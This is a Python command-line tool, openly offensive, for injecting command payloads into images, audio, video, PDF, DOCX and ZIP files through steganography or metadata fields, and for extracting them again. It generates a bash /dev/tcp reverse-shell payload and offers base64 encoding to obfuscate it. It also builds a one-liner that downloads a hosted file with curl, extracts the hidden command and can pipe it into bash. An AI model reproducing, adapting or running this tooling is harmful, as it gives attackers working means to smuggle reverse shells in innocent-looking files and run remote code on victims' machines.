import argparse
import base64
import logging
import os
import shutil
import subprocess
import sys

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MEDIA_TYPES = {"png", "jpg", "jpeg", "mp3", "mp4", "pdf", "docx", "zip"}
STEGHIDE_TYPES = {"jpg", "jpeg", "bmp", "wav", "au"}


def require_tools(tools):
    missing = [tool for tool in tools if shutil.which(tool) is None]
    if missing:
        logging.error("Missing required tools: %s", ", ".join(missing))
        sys.exit(1)


def get_extension(filename):
    _, ext = os.path.splitext(filename)
    if not ext:
        logging.error("File has no extension: %s", filename)
        sys.exit(1)
    return ext.lstrip(".").lower()


def is_media_compatible(file_extension):
    return file_extension.lower() in MEDIA_TYPES


def is_steghide_compatible(file_extension):
    return file_extension.lower() in STEGHIDE_TYPES

# Generate reverse shell payload dynamically
def generate_payload(payload_type, ip, port):
    if payload_type == "reverse_shell":
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        logging.info(f"Generated reverse shell payload for IP: {ip}, Port: {port}")
        return payload
    else:
        logging.error("Unsupported payload type")
        raise ValueError("Unsupported payload type")

# Inject payload into media file using steganography
def inject_with_steganography(command, filename):
    try:
        require_tools(["steghide"])
        subprocess.run(["steghide", "embed", "-cf", filename, "-ef", "/dev/stdin", "-p", ""], input=command.encode(), check=True)
        logging.info(f"Payload successfully injected into {filename} using steganography.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Steganography injection failed: {e}")

# Inject payload using metadata tools
def inject_metadata(command, filename, output_path=None):
    file_extension = get_extension(filename)
    try:
        if file_extension in ["png", "jpg", "jpeg"]:
            require_tools(["exiftool"])
            cmd = ["exiftool", "-overwrite_original", f"-Comment={command}"]
            if output_path:
                cmd.extend(["-o", output_path])
            cmd.append(filename)
            subprocess.run(cmd, check=True)
        elif file_extension in ["mp4", "mp3"]:
            require_tools(["ffmpeg"])
            output_file = output_path or f"injected_{os.path.basename(filename)}"
            subprocess.run(["ffmpeg", "-i", filename, "-metadata", f"comment={command}", "-codec", "copy", output_file], check=True)
        elif file_extension == "pdf":
            require_tools(["exiftool"])
            cmd = ["exiftool", "-overwrite_original", f"-Title={command}"]
            if output_path:
                cmd.extend(["-o", output_path])
            cmd.append(filename)
            subprocess.run(cmd, check=True)
        elif file_extension == "docx":
            require_tools(["exiftool"])
            cmd = ["exiftool", "-overwrite_original", f"-Comment={command}"]
            if output_path:
                cmd.extend(["-o", output_path])
            cmd.append(filename)
            subprocess.run(cmd, check=True)
        elif file_extension == "zip":
            require_tools(["zip"])
            if output_path:
                subprocess.run(["cp", filename, output_path], check=True)
                target = output_path
            else:
                target = filename
            subprocess.run(["zip", "-z", target], input=command.encode(), check=True)
        else:
            logging.error(f"Unsupported media type for command injection: {file_extension}")
            raise ValueError(f"Unsupported media type: {file_extension}")
        logging.info("Payload successfully injected into %s", output_path or filename)
    except subprocess.CalledProcessError as e:
        logging.error(f"Metadata injection failed: {e}")

# Extract payload from the media file
def extract_payload(filename):
    file_extension = get_extension(filename)

    try:
        if file_extension in ["png", "jpg", "jpeg"]:
            require_tools(["exiftool"])
            result = subprocess.run(["exiftool", "-s", "-s", "-s", "-Comment", filename], stdout=subprocess.PIPE, check=True)
        elif file_extension in ["mp4", "mp3"]:
            require_tools(["ffprobe"])
            result = subprocess.run(
                ["ffprobe", "-v", "error", "-show_entries", "format_tags=comment", "-of", "default=nw=1:nk=1", filename],
                stdout=subprocess.PIPE,
                check=True,
            )
        elif file_extension == "pdf":
            require_tools(["exiftool"])
            result = subprocess.run(["exiftool", "-s", "-s", "-s", "-Title", filename], stdout=subprocess.PIPE, check=True)
        elif file_extension in ["docx", "zip"]:
            if file_extension == "docx":
                require_tools(["exiftool"])
                result = subprocess.run(["exiftool", "-s", "-s", "-s", "-Comment", filename], stdout=subprocess.PIPE, check=True)
                if not result.stdout.strip():
                    result = subprocess.run(["exiftool", "-s", "-s", "-s", "-Title", filename], stdout=subprocess.PIPE, check=True)
            else:
                require_tools(["unzip"])
                result = subprocess.run(["unzip", "-z", filename], stdout=subprocess.PIPE, check=True)
        else:
            logging.error(f"Unsupported media type for payload extraction: {file_extension}")
            raise ValueError(f"Unsupported media type: {file_extension}")

        logging.info(f"Payload extracted from {filename}")
        return result.stdout.decode()
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to extract payload: {e}")
        return ""

# Base64 encoding and decoding
def base64_encode_command(command):
    encoded_cmd = base64.b64encode(command.encode()).decode()
    logging.info("Payload encoded in base64")
    return encoded_cmd

def generate_oneliner(url, filename, method, allow_exec):
    basename = os.path.basename(filename)
    extractor = {
        "image": "exiftool -s -s -s -Comment \"$tmp\"",
        "video": "ffprobe -v error -show_entries format_tags=comment -of default=nw=1:nk=1 \"$tmp\"",
        "pdf": "exiftool -s -s -s -Title \"$tmp\"",
        "docx": "exiftool -s -s -s -Comment \"$tmp\"",
        "zip": "unzip -z \"$tmp\"",
    }.get(method)
    if not extractor:
        return None

    cmd = (
        f"tmp=$(mktemp); curl -fsSL '{url}/{basename}' -o \"$tmp\"; "
        f"payload=$({extractor}); rm -f \"$tmp\"; echo \"$payload\""
    )
    if allow_exec:
        cmd = f"{cmd}; echo \"$payload\" | bash"
    return cmd

def parse_args():
    parser = argparse.ArgumentParser(description="Payload injection and extraction tool with steganography and metadata support.")
    subparsers = parser.add_subparsers(dest="command", required=True)

    check_parser = subparsers.add_parser("check", help="Check media file compatibility")
    check_parser.add_argument("-f", "--file", required=True, help="Filename to check")

    inject_parser = subparsers.add_parser("inject", help="Inject payload into a media file")
    inject_parser.add_argument("-f", "--file", required=True, help="Filename for payload injection")
    inject_parser.add_argument("-p", "--payload", required=True, help="Payload string or 'reverse_shell'")
    inject_parser.add_argument("-i", "--ip", help="IP address for reverse shell payload")
    inject_parser.add_argument("-r", "--port", help="Port for reverse shell payload")
    inject_parser.add_argument("-s", "--steganography", action="store_true", help="Use steganography for payload injection")
    inject_parser.add_argument("-b", "--base64", action="store_true", help="Base64 encode the payload before injection")
    inject_parser.add_argument("-o", "--out", help="Output file path (when supported)")

    extract_parser = subparsers.add_parser("extract", help="Extract payload from a media file")
    extract_parser.add_argument("-f", "--file", required=True, help="Filename for payload extraction")
    extract_parser.add_argument("-o", "--out", help="Output file path for extracted payload")

    one_liner_parser = subparsers.add_parser("one-liner", help="Generate a one-liner for payload extraction")
    one_liner_parser.add_argument("-f", "--file", required=True, help="Filename for payload extraction")
    one_liner_parser.add_argument("-u", "--url", required=True, help="URL hosting the file")
    one_liner_parser.add_argument(
        "-m",
        "--method",
        choices=["auto", "image", "video", "pdf", "docx", "zip"],
        default="auto",
        help="Extraction method to generate",
    )
    one_liner_parser.add_argument("--allow-exec", action="store_true", help="Allow generated one-liner to execute payload")
    one_liner_parser.add_argument("-b", "--base64", action="store_true", help="Base64 encode the generated one-liner")

    return parser.parse_args()

def main():
    args = parse_args()

    if args.command == "check":
        file_extension = get_extension(args.file)
        if is_media_compatible(file_extension):
            logging.info("File type %s is compatible", file_extension)
        else:
            logging.error("File type %s is not supported", file_extension)
            sys.exit(1)
        return

    if args.command == "extract":
        if not os.path.isfile(args.file):
            logging.error("File not found: %s", args.file)
            sys.exit(1)
        payload = extract_payload(args.file)
        if args.out:
            with open(args.out, "w", encoding="utf-8") as handle:
                handle.write(payload)
            logging.info("Extracted payload written to %s", args.out)
        else:
            print(payload)
        return

    if args.command == "inject":
        if not os.path.isfile(args.file):
            logging.error("File not found: %s", args.file)
            sys.exit(1)
        if args.payload == "reverse_shell":
            if not (args.ip and args.port):
                logging.error("IP and port are required for reverse_shell payload")
                sys.exit(1)
            command = generate_payload(args.payload, args.ip, args.port)
        else:
            command = args.payload
        if args.base64:
            command = base64_encode_command(command)

        file_extension = get_extension(args.file)
        if not is_media_compatible(file_extension):
            logging.error("Invalid or unsupported file: %s", args.file)
            sys.exit(1)
        if args.steganography:
            if not is_steghide_compatible(file_extension):
                logging.error("Steganography supported for: %s", ", ".join(sorted(STEGHIDE_TYPES)))
                sys.exit(1)
            inject_with_steganography(command, args.file)
        else:
            inject_metadata(command, args.file, args.out)
        return

    if args.command == "one-liner":
        file_extension = get_extension(args.file)
        method = args.method
        if method == "auto":
            mapping = {
                "png": "image",
                "jpg": "image",
                "jpeg": "image",
                "mp4": "video",
                "mp3": "video",
                "pdf": "pdf",
                "docx": "docx",
                "zip": "zip",
            }
            method = mapping.get(file_extension)
        if not method:
            logging.error("Unable to infer one-liner method for file type: %s", file_extension)
            sys.exit(1)
        one_liner = generate_oneliner(args.url, args.file, method, args.allow_exec)
        if not one_liner:
            logging.error("Invalid method choice")
            sys.exit(1)
        if args.base64:
            one_liner = base64_encode_command(one_liner)
            print(f"Base64 encoded one-liner:\n{one_liner}")
        else:
            print(f"Generated one-liner:\n{one_liner}")

if __name__ == "__main__":
    main()
